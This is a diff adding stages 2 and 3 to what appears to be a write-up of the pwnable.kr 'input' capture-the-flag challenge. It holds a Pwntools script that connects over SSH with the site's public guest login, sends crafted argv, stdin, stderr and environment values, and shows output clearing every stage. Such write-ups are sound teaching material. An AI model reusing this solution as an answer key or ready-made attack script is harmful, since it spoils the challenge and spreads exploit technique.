@@ -106,4 +106,41 @@ Let's see if you know how to give input to program
 Just give me correct inputs then you will get the flag :)
 ```
 
-On to stage 2.
+On to stage 2 and 3. We need to be able to send data to stdin (fd 0) and stderr (fd 2). Pwntools allows us to easily input on stdin, but for stderr we need to read from a file on the server. I just made a temporary file and read from that. Setting environment variables for stage 3 is pretty easy in Pwntools as well so I went ahead and did that.
+
+```
+from pwn import *
+import os
+s = ssh(host='pwnable.kr',
+        user='input2',
+        password='guest',
+        port=2222)
+  
+arr = [b'\x00']*100
+arr[0] = './input'
+arr[66] = b'\x20\x0a\x0d'
+
+p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
+p.sendline(b'\x00\x0a\x02\xff')
+p.kill()
+
+p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'});
+p.sendline(b'\x00\x0a\x00\xff')	
+p.interactive()
+```
+
+```
+(ctf-python) [huck@knuth] python3 exploit.py
+[+] Connecting to pwnable.kr on port 2222: Done
+[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
+[*] Closed SSH channel with pwnable.kr
+[+] Opening new channel: execve(b'./input', [b'./input', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b' \n\r', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', ...: Done
+[*] Switching to interactive mode
+Welcome to pwnable.kr
+Let's see if you know how to give input to program
+Just give me correct inputs then you will get the flag :)
+Stage 1 clear!
+Stage 2 clear!
+Stage 3 clear!
+[*] Got EOF while reading in interactive
+```
